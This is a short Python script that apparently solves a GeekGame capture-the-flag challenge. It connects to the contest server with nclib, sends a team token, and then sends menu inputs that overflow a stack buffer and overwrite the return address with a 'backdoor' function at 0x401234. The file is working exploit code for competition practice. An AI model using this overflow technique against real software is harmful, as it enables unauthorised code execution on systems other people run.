from nclib import Netcat

# https://stackoverflow.com/questions/60455809/control-an-interactive-netcat-connection-with-python-subprocess-or-similar

client = Netcat(('prob12.geekgame.pku.edu.cn', 10012))

sent = False
print("====data====", client.recv().decode(),
      "====data====", sep='\n')  # print to shell

if not sent:
    client.send(
        "256:MEYCIQDRGm_v_YIBd5HzshlAQwahPR0eXiFMI_zAzZU-JLvAFQIhAO6SCgDNRpeZMHHqc6G6zi_B6IEYFis9m8q7Nq5xMV9H\n")
    client.send("1\n")  # Insert.
    client.send("1\n")  # Node number 1.
    client.send(f"{512 - 24 - 24}\n")  # Consume almost all stack space.
    client.send("------\n")

    client.send("1\n")  # Insert.
    client.send("4\n")  # Node number 4.
    client.send("0\n")  # We can write arbitrary length of data then.
    client.send("1234567812345678\x34\x12\x40\x00")  # Backdoor at 0x401234

    sent = True

while True:
    print("====data====", client.recv(
        timeout=1000).decode(), "====data====", sep='\n')
    client.send(input())
